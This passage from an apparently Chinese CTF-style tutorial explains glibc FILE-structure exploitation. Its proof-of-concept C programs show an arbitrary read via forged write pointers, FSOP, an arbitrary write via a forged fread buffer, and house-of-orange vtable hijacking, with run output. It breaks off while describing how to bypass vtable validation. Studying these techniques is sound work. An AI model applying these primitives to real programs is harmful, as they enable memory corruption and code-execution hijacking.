class="line">        _IO_free_backup_area(f);</span><br><span class="line">        f-&gt;_IO_read_base -= MIN(nbackup,</span><br><span class="line">                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-fp-IO-read-end-secret"><a href="#4-fp-IO-read-end-secret" class="headerlink" title="4.fp-&gt;_IO_read_end = secret; "></a>4.<code>fp-&gt;_IO_read_end = secret; </code></h4><p>这条是为了绕过<code>new_do_write</code>中的检查,</p>
<p>要么<code>_flags</code>中有<code>_IO_IS_APPENDING(0x1000)</code>标志,</p>
<p>要么<code>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</code></p>
<p>才能避免<code>_IO_SYSSEEK</code>的调用,因为<code>_IO_SYSSEEK</code>调用后<code>new_pos == _IO_pos_BA</code>,接下来就返回了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">off64_t</span> new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_offset = new_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此将<code>flags</code>置位<code>_IO_IS_APPENDING</code>也可以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure>



<h4 id="FSOP方法"><a href="#FSOP方法" class="headerlink" title="FSOP方法"></a>FSOP方法</h4><p>如果没有fwrite调用,也可以考虑利用FSOP方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;flag&#123;dustball&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>; <span class="comment">//IO_CURRENTLY_PUTTING</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end = secret;      //IO_read_end must equals to write_base to overpass check in</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;                  <span class="comment">//stdout</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//no fwrite , however fp is linked to _IO_list_all, use FSOP</span></span><br><span class="line">    <span class="comment">// fwrite(buffer,0x100,0x1,fp);     </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> key = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="comment">//fp -&gt; _flags不能有IO_NO_READS,也不能有_IO_EOF_SEEN</span></span><br><span class="line">  fp -&gt; _IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_read_end = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_buf_base = &amp;key;</span><br><span class="line">  fp -&gt; _IO_buf_end = &amp;key + <span class="number">4</span>;</span><br><span class="line">  fp -&gt; _fileno = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  fread(buffer,<span class="number">1</span>,<span class="number">4</span>,fp);             <span class="comment">//方向fp -&gt; _IO_buf_base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,key);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_buf_base = target_addr;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fread</span><br><span class="line">	_IO_sgetn =&gt; _IO_file_xsgetn</span><br><span class="line">		__underflow</span><br><span class="line">			_IO_UNDERFLOW =&gt; _IO_file_underflow</span><br><span class="line">				_IO_SYSREAD =&gt; _IO_file_read</span><br><span class="line">					__read</span><br></pre></td></tr></table></figure>

<p>从而实现往<code>target_addr</code>写入任意数据</p>
<p>为了实现这一目的，还需要设置fp的其他参数</p>
<h4 id="1-fp-fopen-flag-r"><a href="#1-fp-fopen-flag-r" class="headerlink" title="-1.fp = fopen(&quot;./flag&quot;,&quot;r&quot;);"></a>-1.<code>fp = fopen(&quot;./flag&quot;,&quot;r&quot;);</code></h4><p><code>fp </code>必须是有读权限的，或者手动设置<code>flag</code>，不能有<code>IO_NO_READS(0x4)</code>标志</p>
<p>同时不能有<code>_IO_EOF_SEEN(0x10)</code></p>
<p>这是因为<code>_IO_file_underflow</code>会对flag进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="0-fp-IO-buf-base-key"><a href="#0-fp-IO-buf-base-key" class="headerlink" title="0.fp -&gt; _IO_buf_base = &amp;key;"></a>0.<code>fp -&gt; _IO_buf_base = &amp;key;</code></h4><p>任意地址写的关键</p>
<h4 id="1-fp-IO-buf-end-key-4"><a href="#1-fp-IO-buf-end-key-4" class="headerlink" title="1.fp -&gt; _IO_buf_end = &amp;key + 4;"></a>1.<code>fp -&gt; _IO_buf_end = &amp;key + 4;</code></h4><p>配合0,必须保证end和base之间的距离要大于fread写入的长度,</p>
<p>这是因为<code>_IO_file_xsgetn</code>中会检查这一点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">    fp-&gt;_IO_read_ptr += want;</span><br><span class="line">    want = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-fp-IO-read-ptr-0-fp-IO-read-end-0"><a href="#2-fp-IO-read-ptr-0-fp-IO-read-end-0" class="headerlink" title="2.fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;"></a>2.<code>fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;</code></h4><p>这是因为在<code>_IO_file_underflow</code>中会检查两者是否相等</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>



<h4 id="3-fp-fileno-0"><a href="#3-fp-fileno-0" class="headerlink" title="3.fp -&gt; _fileno = 0;"></a>3.<code>fp -&gt; _fileno = 0;</code></h4><p>给予我们从标准输入获取任意字符到目标地址的权利</p>
<h3 id="house-of-orange-glibc"><a href="#house-of-orange-glibc" class="headerlink" title="[house of orange @ glibc &lt;&#x3D; 2.23]"></a>[house of orange @ glibc &lt;&#x3D; 2.23]</h3><p>通过堆利用手段，控制堆上的<code>FILE</code>结构体，能够修改<code>vtable</code>指针，具体怎么堆利用，这不重要</p>
<p>重要的是把<code>vtable</code>指针修改为构造的假表中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">size_t</span> *fake_vtable;</span><br><span class="line">  <span class="type">size_t</span> *vtable_ptr;</span><br><span class="line">  <span class="type">size_t</span> *vtable_addr;</span><br><span class="line"></span><br><span class="line">  fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_vtable @ %p\n&quot;</span>, fake_vtable);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123; <span class="comment">// 我今天就是要把这假表狠狠塞满</span></span><br><span class="line">    fake_vtable[i] = (<span class="type">size_t</span>)win;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fp @ %p\n&quot;</span>, fp);    </span><br><span class="line"></span><br><span class="line">  <span class="comment">//_IO_FILE_plus中vtable指针的偏移地址为0xd8</span></span><br><span class="line">  vtable_ptr  = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;vtable_ptr = %p\n&quot;</span>, vtable_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//曾经的vtable指针</span></span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;original vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//修改vtable指针指向假虚表</span></span><br><span class="line">  *vtable_ptr = fake_vtable;</span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;new vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  fclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ubuntu16.04 &amp; glibc-2.23</code>上实验,成功劫持了虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test<span class="meta"># gcc orange.c -o orange -no-pie -g -no-pie -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x1690010</span></span><br><span class="line">fp @ <span class="number">0x1690530</span></span><br><span class="line">vtable_ptr = <span class="number">0x1690608</span></span><br><span class="line">original vtable_addr = <span class="number">0x7fd1b3f3c6e0</span></span><br><span class="line">new vtable_addr = <span class="number">0x1690010</span></span><br><span class="line">function win called</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>

<p> 同样的代码对于更高版本的<code>glibc</code>无效</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test]</span><br><span class="line">└─# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x123e2a0</span></span><br><span class="line">fp @ <span class="number">0x123e7c0</span></span><br><span class="line">vtable_ptr = <span class="number">0x123e898</span></span><br><span class="line">original vtable_addr = <span class="number">0x7f4da32ca070</span></span><br><span class="line">new vtable_addr = <span class="number">0x123e2a0</span></span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>



<h3 id="house-of-apple-glibc-2-23"><a href="#house-of-apple-glibc-2-23" class="headerlink" title="[house of apple @ glibc &gt; 2.23]"></a>[house of apple @ glibc &gt; 2.23]</h3><p>针对虚表的攻击通常能够想到两种方式</p>
<p>1.保持虚表地址不变,修改虚表上的函数指针</p>
<p>2.造假虚表,然后修改虚表指针</p>
<p>对于1来说,虚表位于<code>glibc</code>的代码段,通常是只读的,不允许随便改函数指针</p>
<p>对于2来说,<code>glibc2.23</code>之前是可以劫持虚表指针的,相关攻击方法叫做<code>house of orange</code></p>
<p><code>glibc2.24</code>之后就加入了虚表的合法性检查</p>
<p>但也不是不能利用了，新方法叫<code>house of apple</code></p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L398</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/libioP.h#L133</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>

<p><code>IO_validate_vtable</code>会检查虚表的合法性</p>
</blockquote>
<p><strong>这个虚表合法性检查会发生在何时呢?</strong></p>
<p><code>fwrite</code>实际上调用<code>_IO_fwrite</code>,<code>if</code>判断通过,会执行<code>__IO_sputn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)	<span class="comment">//</span></span><br><span class="line">  written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);	<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>这里<code>_IO_sputn</code>是一个宏定义,会在检查<code>vtable</code>合法性之后调用<code>vtable.xsputn</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp,__s,__n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line">扩展到:</span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsputn) (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>同理,不管<code>fread</code>还是<code>fwrite</code>实际上都会在经过<code>vtable</code>合法性检查后,调用<code>vtable</code>中的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>虚表合法性检查了什么呢?</strong></p>
<p>而<code>IO_validate_vtable</code>会检查虚表是否是<code>glibc</code>预定义好的虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ptr = vtable</code>是<code>FILE</code>结构的虚表指针</p>
<p><code>const struct _IO_jump_t __io_vtables[]</code>是<code>vtables.c</code>中预定义好的虚表数组</p>
<p>在<code>libioP.h</code>中暴露了这些虚表的引用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> __<span class="title">io_vtables</span>[] <span class="title">attribute_hidden</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_VTABLES_LEN (IO_VTABLES_NUM * sizeof (struct _IO_jump_t))</span></span><br><span class="line">IO_VTABLES_NUM = <span class="number">14</span></span><br><span class="line"><span class="keyword">sizeof</span> (<span class="keyword">struct</span> _IO_jump_t) = <span class="number">168</span></span><br><span class="line">IO_VTABLES_LEN = <span class="number">14</span>*<span class="number">168</span> = <span class="number">2352</span></span><br></pre></td></tr></table></figure>

<p>也就是说一共有14个预定义的虚表</p>
<p>通常情况下使用的虚表是<code>_IO_file_jumps = __io_vtables[IO_FILE_JUMPS]</code></p>
<p><code>IO_validate_vtable</code>检查虚表<strong>必须是这14个其中之一</strong>,防止被用户劫持篡改指向了堆栈或者堆</p>
<p><strong>如何绕过虚表检查呢?</strong></p>
<p>当fread函数被调用时,调用过程是这样的:</p>
